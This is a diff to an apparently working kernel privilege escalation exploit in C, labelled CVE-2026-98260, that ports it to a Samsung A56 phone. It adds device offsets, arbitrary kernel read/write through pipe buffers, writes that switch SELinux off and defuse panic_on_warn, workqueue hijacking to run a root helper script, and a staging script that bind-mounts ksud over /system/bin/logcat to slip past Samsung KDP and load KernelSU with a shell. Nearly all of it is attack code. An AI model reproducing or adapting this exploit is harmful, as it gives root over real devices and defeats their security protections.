@@ -1,17 +1,15 @@
 /*
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : Xiaomi aurora (SM8650), Android 14
- * Kernel : 6.1.75-android14-11-gfa9b7054770e-mi
- * Build  : AQ3A.240627.003
+ * Target : Samsung SM-A566S (a56x), Android 17 / One UI 9
+ * Kernel : 6.6.127-android15-8-abA566SKSUADZJ1-4k
+ * Build  : A566SKSUADZJ1
  * SELinux: Enforcing
  * Patches: absent
  * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
  *
- * Ported from the 6.12.69 (android16-6) profile.  Every address and struct
- * offset below was re-derived from this image's .symtab, .BTF and
- * disassembly; the 6.1 cred layout differs (4-byte usage, uid at 4), the
- * fake erase must stay self-parent so the exit loop's rb_next() returns
- * NULL, and uid/euid need two repair writes afterwards.
+ * Ported from SamTimer's 6.1 Samsung profile. Every address and struct
+ * offset was re-derived from the matching stock boot image's kallsyms, BTF,
+ * and ARM64 disassembly. The production app uses the umhpipe endgame.
  *
  * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
  * The trigger, slab layout and offsets are the same; the do_timer_create
@@ -29,13 +27,13 @@
  *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
  *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
  *     blob.  The worker execs ksud late-load, which resolves the installed
- *     manager's libksud.so and loads the matching android14-6.1 module.
+ *     manager's libksud.so and loads the matching android15-6.6 module.
  *     The parent parks with its socket buffers holding the fake cred page.
  *
- * The trigger leaves a stale timerqueue node; every failed plant parks
- * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
- * is the only cleanup.  Event ids and the linear-map base are discovered at
- * runtime; the tracefs metadata files are not readable from the shell domain.
+ * Failed plants are repaired and reaped when their task address and write
+ * probe can be verified. A holder parks only as the last-resort fallback,
+ * in which case reboot is the only safe cleanup. Event ids and the linear-map
+ * base are discovered at runtime.
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -1195,9 +1193,8 @@ static void build_payload(unsigned char *buf, size_t off,
  * Shape copied verbatim from BuSung-dev/Root-My-Galaxy-Payloads
  * su_daemon.c:run_kernelsu_late_load -- the upstream flow verified across
  * the supported Samsung fleet (fusion-s24u inherited it from them):
- *   - ksud late-load --ephemeral --package-name me.weishu.kernelsu
- *     (no --allow-shell: su must come from the manager app only;
- *      no --kmi: ksud picks its embedded module from the running kernel)
+ *   - ksud late-load --allow-shell --package-name me.weishu.kernelsu
+ *     (no --kmi: ksud picks its embedded module from the running kernel)
  *   - executed through the /system/bin/logcat bind mount the C side set up
  *     in a private mount namespace (Android 16+ KDP SIGKILLs a directly
  *     exec'ed kdp-variant ksud); the namespace dies with this worker, so
@@ -1287,20 +1284,20 @@ static void write_ksu_script(void)
         "fi\n"
         /* If the C-side bind mount worked, /system/bin/logcat IS ksud
          * (KDP-safe path).  Real logcat never prints ksud/KernelSU.
-         * No --ephemeral: the e1s pair's ksud does not have that option
+         * No --ephemeral: the A56 pair's ksud does not have that option
          * (verified: late-load --help lists only magica/allow-shell/
          * post-magica/kmi/package-name); plain late-load performs the
          * full install, which is the device-tested flow for these pairs. */
         "if /system/bin/logcat --version 2>/dev/null | "
         "grep -qiE 'ksud|kernelsu'; then\n"
         "  echo '[ksu] bind mount active, exec via logcat path'\n"
-        "  /system/bin/logcat late-load "
-        "--package-name com.rifsxd.ksunext\n"
+        "  /system/bin/logcat late-load --allow-shell "
+        "--package-name me.weishu.kernelsu\n"
         "  RC=$?\n"
         "else\n"
         "  echo '[ksu] no bind mount; direct exec (KDP may kill)'\n"
-        "  \"$KSUD\" late-load "
-        "--package-name com.rifsxd.ksunext\n"
+        "  \"$KSUD\" late-load --allow-shell "
+        "--package-name me.weishu.kernelsu\n"
         "  RC=$?\n"
         "fi\n"
         "echo \"[ksu] late-load rc=$RC\"\n"
@@ -1433,16 +1430,27 @@ static void write_umh_script(void)
         "echo \"[umh] start uid=$(id -u) "
         "ctx=$(cat /proc/self/attr/current 2>/dev/null) "
         "enf=$(getenforce 2>/dev/null)\"\n"
+        "finish() { R=$?; trap - EXIT; "
+        "echo 1 > /proc/sys/kernel/panic_on_warn 2>/dev/null; "
+        "if ! grep -q '^kernelsu ' /proc/modules 2>/dev/null; then "
+        "echo 1 > /sys/fs/selinux/enforce 2>/dev/null; fi; exit $R; }\n"
+        "trap finish EXIT\n"
         /* readiness marker first: the exploit parent polls for it */
         ": > /data/local/tmp/samtimer/umh-action.log\n"
         /* KSU's sepolicy only lets init reach the ksud domain */
         "echo -n u:r:init:s0 > /proc/self/attr/current 2>/dev/null\n"
         "unshare -m sh -c '\n"
+        "  cp -f /data/local/tmp/samtimer/ksud "
+        "/data/local/tmp/.ksud-stage || { echo stage_copy_failed; exit 15; }\n"
+        "  chmod 0755 /data/local/tmp/.ksud-stage\n"
         "  mount --bind /data/local/tmp/samtimer/ksud /system/bin/logcat "
         "|| { echo mount_failed; exit 11; }\n"
         "  echo \"[umh] bind mounted kdp\"\n"
         "  /system/bin/logcat --version\n"
-        "  exec sh /data/local/tmp/ksu_stage.sh\n"
+        "  . /data/local/tmp/ksu_stage.sh\n"
+        "  RC=$?\n"
+        "  umount /system/bin/logcat 2>/dev/null\n"
+        "  exit $RC\n"
         "'\n"
         "echo \"[umh] outer rc=$?\"\n";
     int fd = open("/data/local/tmp/samtimer/umh_action.sh",
@@ -3217,7 +3225,7 @@ static int umhpipe_main(unsigned char *raw)
     memset(&r, 0, sizeof(r));
 
     /*
-     * e1s runs with panic_on_warn=1; the self-parent (RB_EMPTY_NODE)
+     * a56x runs with panic_on_warn=1; the self-parent (RB_EMPTY_NODE)
      * plants take timerqueue_del()'s WARN_ON_ONCE, so the warning must be
      * defused before the first plant.  The stage script restores it.
      */
@@ -3442,13 +3450,22 @@ static int umhpipe_main(unsigned char *raw)
 
     if (g_umh_dry)
     {
-        /* Restore pipe->bufs before parking: nothing else will. */
+        unsigned int one = 1;
+
+        /* Restore the boot policy changed by the first safety plant. */
+        (void)user_pipe_write(pf[1], mark,
+                              alias_of_kimg(PANIC_ON_WARN_STATIC),
+                              &one, sizeof(one));
+        /* Restore pipe->bufs before returning: nothing else will. */
         if (g_pipe_bufs)
             user_pipe_write(pf[1], mark, g_pipe_addr + PIPE_INFO_BUF_OFF,
                             &g_pipe_bufs, sizeof(g_pipe_bufs));
         logf("[+] UMH_DRY_READY wq=%#llx pwq=%#llx pool=%#llx\n",
              wq, pwq, pool);
-        park_forever("umh dry run -- offsets validated, not injecting");
+        if (g_held)
+            park_forever("umh dry run validated, but zombies are held");
+        logf("[+] umh dry run cleaned up without injection\n");
+        return 0;
     }
 
     if (access(ROOT_UMH_PATH, X_OK) != 0)
@@ -3575,6 +3592,76 @@ static int umhpipe_main(unsigned char *raw)
             logf("[+] umh selinux write n=%d enforce now=%c\n", sn,
                  enf[0]);
         }
+
+        /*
+         * Changing SELinux mode emits audit/notification work on Samsung's
+         * system_unbound_wq.  Publishing immediately after that write races
+         * the real work and makes the empty-list check fail.  Wait for two
+         * consecutive empty observations, then refresh every pwq counter:
+         * the work that just drained may have changed them.
+         */
+        {
+            int quiet = 0;
+
+            for (int t = 0; t < 100 && !quiet; t++)
+            {
+                unsigned long long qn = 0, qp = 0;
+
+                if (user_pipe_read(pf[0], mark, worklist, &qn, 8) == 8 &&
+                    user_pipe_read(pf[0], mark, worklist + 8, &qp, 8) == 8 &&
+                    qn == worklist && qp == worklist)
+                {
+                    usleep(20000);
+                    if (user_pipe_read(pf[0], mark, worklist, &qn, 8) == 8 &&
+                        user_pipe_read(pf[0], mark, worklist + 8, &qp, 8) == 8 &&
+                        qn == worklist && qp == worklist)
+                        quiet = 1;
+                }
+                if (!quiet)
+                    usleep(20000);
+            }
+            if (!quiet)
+            {
+                unsigned char enforce = 1;
+                unsigned int panic = 1;
+
+                (void)user_pipe_write(pf[1], mark,
+                                      SELINUX_STATE_STATIC + g_slide,
+                                      &enforce, sizeof(enforce));
+                (void)user_pipe_write(pf[1], mark,
+                                      alias_of_kimg(PANIC_ON_WARN_STATIC),
+                                      &panic, sizeof(panic));
+                if (g_pipe_bufs)
+                    (void)user_pipe_write(pf[1], mark,
+                                          g_pipe_addr + PIPE_INFO_BUF_OFF,
+                                          &g_pipe_bufs, sizeof(g_pipe_bufs));
+                logf("[-] umh worklist did not quiesce; state restored\n");
+                if (g_held)
+                    park_forever("umh quiet wait failed with zombies held");
+                return 2;
+            }
+        }
+
+        if (user_pipe_read(pf[0], mark, pwq + PWQ_WORK_COLOR_OFF,
+                           &color, 4) != 4 ||
+            user_pipe_read(pf[0], mark, pwq + PWQ_REFCNT_OFF,
+                           &refcnt, 4) != 4 ||
+            user_pipe_read(pf[0], mark, pwq + PWQ_NR_ACTIVE_OFF,
+                           &nr_active, 4) != 4 ||
+            user_pipe_read(pf[0], mark, pwq + PWQ_MAX_ACTIVE_OFF,
+                           &max_active, 4) != 4)
+            park_forever("umh refreshed pwq state read failed");
+        if (color >= 16 || refcnt == 0 || nr_active >= max_active)
+            park_forever("umh refreshed bad pwq state");
+        inflight_addr = pwq + PWQ_NR_IN_FLIGHT_OFF +
+                        (unsigned long long)color * 4;
+        if (user_pipe_read(pf[0], mark, inflight_addr,
+                           &nr_inflight, 4) != 4)
+            park_forever("umh refreshed nr_inflight read failed");
+        w[0] = pwq | ((unsigned long long)color << 4) | 5;
+        logf("[+] umh pwq refreshed color=%u refcnt=%u active=%u/%u "
+             "inflight=%u\n", color, refcnt, nr_active, max_active,
+             nr_inflight);
 
         /* __queue_work-equivalent accounting on the real pwq. */
         v32 = nr_inflight + 1;
@@ -3738,7 +3825,7 @@ static int umhpipe_main(unsigned char *raw)
                 break;
             usleep(100000);
         }
-        if (ksu_ok)
+        if (ksu_ok && verify_ksu_control() == 0)
             logf("KSU_LOADED\n");
         else
             logf("KSU_MISSING\n");
@@ -3774,6 +3861,8 @@ int main(int argc, char **argv)
         return setksu_main();
     if (argc > 1 && !strcmp(argv[1], "--umh"))
         return setksu_main();
+    if (argc > 1 && !strcmp(argv[1], "ksucheck"))
+        return verify_ksu_control();
 
     if (argc > 1 && !strcmp(argv[1], "shell"))
         shell_mode = 1;
